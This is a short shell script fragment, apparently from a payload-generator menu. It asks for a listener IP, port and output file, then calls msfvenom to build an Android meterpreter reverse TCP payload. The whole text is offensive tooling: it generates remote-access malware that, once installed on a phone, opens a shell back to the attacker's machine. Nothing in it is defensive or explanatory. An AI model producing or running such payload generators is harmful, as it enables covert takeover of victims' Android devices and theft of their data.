	echo "Platform : Android/Reverse TCP Shell"
	echo ""
	echo -n "Enter Listener IP: "
	read IP

	echo Using IP : $IP

        echo -n "Enter Listener Port: "
        read PORT

	echo Using Port : $PORT

	echo -n "Where Should I Say The Output?: "
	read OUTPUT

	echo Saving TO $OUTPUT

	msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT R>  $OUTPUT
